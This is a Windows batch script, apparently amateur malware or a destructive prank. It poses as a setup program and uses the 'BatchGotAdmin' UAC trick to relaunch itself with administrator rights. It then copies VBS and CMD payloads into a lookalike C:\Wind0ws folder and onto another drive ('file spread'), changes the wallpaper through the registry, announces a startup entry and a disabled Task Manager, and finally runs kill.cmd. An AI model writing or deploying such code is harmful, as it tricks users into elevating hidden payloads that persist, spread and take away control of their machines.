@echo on

:: BatchGotAdmin
:-------------------------------------
REM  --> Check for permissions
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Starting Setup...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"

echo Starting file spread

copy msg.vbs C:\Wind0ws
copy runatstart.cmd C:\Wind0ws
copy msg.vbs C:\Wind0ws
copy stw.vbs C:\Wind0ws
copy e.cmd C:\Wind0ws
start echo Setup complete
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d  C:\Wind\back.jpg /t
copy kill.cmd C:\Wind0ws


copy msg.vbs A:\Wind0ws
copy runatstart.cmd A:\Wind0ws
copy msg.vbs A:\Wind0ws
copy stw.vbs A:\Wind0ws
copy e.cmd A:\Wind0ws

echo Done!!! Restarting.  (Note: The startup process has been added and taskmgr disabled!!!!)
echo Done!!! Restarting.  (Note: The startup process has been added and taskmgr disabled!!!!)
echo Done!!! Restarting.  (Note: The startup process has been added and taskmgr disabled!!!!)
echo Done!!! Restarting.  (Note: The startup process has been added and taskmgr disabled!!!!)
echo Done!!! Restarting.  (Note: The startup process has been added and taskmgr disabled!!!!)
echo Done!!! Restarting.  (Note: The startup process has been added and taskmgr disabled!!!!)


powershell wininit
powershell wininit
powershell wininit
C:\Wind0ws\kill.cmd